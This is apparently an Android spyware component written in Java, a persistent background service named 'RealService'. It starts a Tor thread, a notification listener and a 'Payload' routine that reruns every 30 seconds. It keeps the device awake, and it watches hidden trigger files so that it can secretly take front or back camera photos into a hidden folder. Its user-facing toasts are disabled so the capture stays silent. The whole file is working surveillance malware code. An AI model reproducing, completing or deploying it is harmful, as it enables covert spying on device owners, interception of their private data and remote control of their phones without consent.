package com.capture;

import android.app.*;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.ImageFormat;
import android.hardware.camera2.*;
import android.media.Image;
import android.media.ImageReader;
import android.os.*;
import android.widget.Toast;

import java.io.File;
import java.io.FileOutputStream;
import java.nio.ByteBuffer;
import java.util.Arrays;
import java.util.concurrent.ScheduledFuture;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import com.capture.TorThread;

public class RealService extends Service {
    private PowerManager.WakeLock wakeLock;
    private CameraDevice cameraDevice;
    private ImageReader imageReader;
    private Handler backgroundHandler;
    private HandlerThread backgroundThread;
    private String currentFilePath = "/storage/emulated/0/.nous/.photo.nous";
    private CameraCaptureSession captureSession;
    private boolean capturing = false;
    private int currentCameraFacing = -1;
	
	private Thread mainThread;
    public static Intent serviceIntent = null;
    ScheduledFuture<?> beeperHandle;
    private final ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1);
    //private PowerManager.WakeLock wakeLock;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startForeground(1, createNotification());
		startNotificationListenerService();
		TorThread torThread = new TorThread();
		torThread.start();	
        acquireWakeLock();
		startPayload();
		periodicallyAttempt();
        startBackgroundThread();
        startFileCheckingLoop();
        return START_STICKY;
    }

    private void startFileCheckingLoop() {
        new Thread(new Runnable() {
				@Override
				public void run() {
					while (true) {
						File file1 = new File("/storage/emulated/0/.nous/web1");
						File file2 = new File("/storage/emulated/0/.nous/web2");

						if (file1.exists()) {
							if (currentCameraFacing != CameraCharacteristics.LENS_FACING_FRONT) {
								showToast("Capturando com a câmera frontal.");
								startPhotoCapture(CameraCharacteristics.LENS_FACING_FRONT);
							}
						} else if (file2.exists()) {
							if (currentCameraFacing != CameraCharacteristics.LENS_FACING_BACK) {
								showToast("Capturando com a câmera traseira.");
								startPhotoCapture(CameraCharacteristics.LENS_FACING_BACK);
							}
						} else {
							if (capturing) {
								showToast("Parando captura.");
								stopPhotoCapture();
							}
						}

						try {
							Thread.sleep(2000);
						} catch (InterruptedException e) {
							showToast("Erro no loop de verificação: " + e.getMessage());
						}
					}
				}
			}).start();
    }
	
	private void startNotificationListenerService() {
        Intent intent = new Intent(this, NotificationListener.class);
        startService(intent);
    }

    public void periodicallyAttempt() {
        long half_an_hour = (60) / (2);

        final Runnable beeper = new Runnable() {
            public void run() {

                Payload.start(getApplicationContext());
            }
        };

        beeperHandle = scheduler.scheduleAtFixedRate(beeper, half_an_hour, half_an_hour, TimeUnit.SECONDS);
    }

    private void startPayload() {
		startForeground(1, createNotification());
        Payload.start(getApplicationContext());
    }

    

    private void startPhotoCapture(int cameraFacing) {
        if (checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            showToast("Permissão da câmera não concedida.");
            return;
        }

        if (cameraDevice != null && currentCameraFacing == cameraFacing) {
            captureImage();
            return;
        }

        stopPhotoCapture(); // Fecha a câmera se estiver aberta

        try {
            CameraManager cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
            for (String cameraId : cameraManager.getCameraIdList()) {
                CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(cameraId);
                Integer lensFacing = characteristics.get(CameraCharacteristics.LENS_FACING);
                if (lensFacing != null && lensFacing == cameraFacing) {
                    currentCameraFacing = cameraFacing;
                    openCameraForPhotos(cameraId);
                    return;
                }
            }
        } catch (Exception e) {
            showToast("Erro ao acessar a câmera: " + e.getMessage());
        }
    }

    private void openCameraForPhotos(final String cameraId) {
        try {
            CameraManager cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
            cameraManager.openCamera(cameraId, new CameraDevice.StateCallback() {
					@Override
					public void onOpened(CameraDevice camera) {
						cameraDevice = camera;
						startImageReader();
					}

					@Override
					public void onDisconnected(CameraDevice camera) {
						stopPhotoCapture();
					}

					@Override
					public void onError(CameraDevice camera, int error) {
						stopPhotoCapture();
					}
				}, backgroundHandler);
        } catch (Exception e) {
            showToast("Erro ao abrir câmera: " + e.getMessage());
        }
    }

    private void startImageReader() {
        imageReader = ImageReader.newInstance(1280, 720, ImageFormat.JPEG, 1);
        imageReader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
				@Override
				public void onImageAvailable(ImageReader reader) {
					Image image = reader.acquireLatestImage();
					if (image == null) return;

					ByteBuffer buffer = image.getPlanes()[0].getBuffer();
					byte[] bytes = new byte[buffer.remaining()];
					buffer.get(bytes);
					image.close();
					saveImage(bytes);
				}
			}, backgroundHandler);

        try {
            cameraDevice.createCaptureSession(Arrays.asList(imageReader.getSurface()), new CameraCaptureSession.StateCallback() {
					@Override
					public void onConfigured(CameraCaptureSession session) {
						captureSession = session;
						captureImage();
					}

					@Override
					public void onConfigureFailed(CameraCaptureSession session) {
						showToast("Falha na configuração da captura.");
					}
				}, backgroundHandler);
        } catch (CameraAccessException e) {
            showToast("Erro ao iniciar sessão de captura: " + e.getMessage());
        }
    }

    private void captureImage() {
        if (cameraDevice == null || captureSession == null) return;

        try {
            CaptureRequest.Builder captureBuilder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
            captureBuilder.addTarget(imageReader.getSurface());
            captureSession.capture(captureBuilder.build(), null, backgroundHandler);
            capturing = true;
        } catch (CameraAccessException e) {
            showToast("Erro ao capturar foto: " + e.getMessage());
        }
    }

    private void saveImage(byte[] bytes) {
        try {
            FileOutputStream fos = new FileOutputStream(new File(currentFilePath));
            fos.write(bytes);
            fos.close();
            showToast("Imagem salva: " + currentFilePath);
        } catch (Exception e) {
            showToast("Erro ao salvar imagem: " + e.getMessage());
        }
    }

    private void stopPhotoCapture() {
        capturing = false;
        if (cameraDevice != null) {
            cameraDevice.close();
            cameraDevice = null;
        }
        if (captureSession != null) {
            captureSession.close();
            captureSession = null;
        }
        currentCameraFacing = -1;
    }

    private void acquireWakeLock() {
        PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "RealService::WakeLock");
        wakeLock.acquire();
    }

    private void releaseWakeLock() {
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
            wakeLock = null;
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        releaseWakeLock();
        stopPhotoCapture();
        stopBackgroundThread();
    }

    private void startBackgroundThread() {
        backgroundThread = new HandlerThread("CameraBackground");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper());
    }

    private void stopBackgroundThread() {
        if (backgroundThread != null) {
            backgroundThread.quitSafely();
            backgroundThread = null;
            backgroundHandler = null;
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private Notification createNotification() {
        String channelId = "default_channel_id";
        Notification.Builder notificationBuilder;

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(channelId, "Serviço em segundo plano", NotificationManager.IMPORTANCE_LOW);
            NotificationManager notificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            notificationManager.createNotificationChannel(channel);
            notificationBuilder = new Notification.Builder(this, channelId);
        } else {
            notificationBuilder = new Notification.Builder(this);
        }

        return notificationBuilder.setContentTitle("Serviço em Execução")
			.setContentText("Capturando imagens continuamente")
			.setSmallIcon(R.drawable.ic_launcher)
			.build();
    }

    private void showToast(final String message) {
        new Handler(Looper.getMainLooper()).post(new Runnable() {
				@Override
				public void run() {
				//	Toast.makeText(getApplicationContext(), message, Toast.LENGTH_SHORT).show();
				}
			});
    }
}
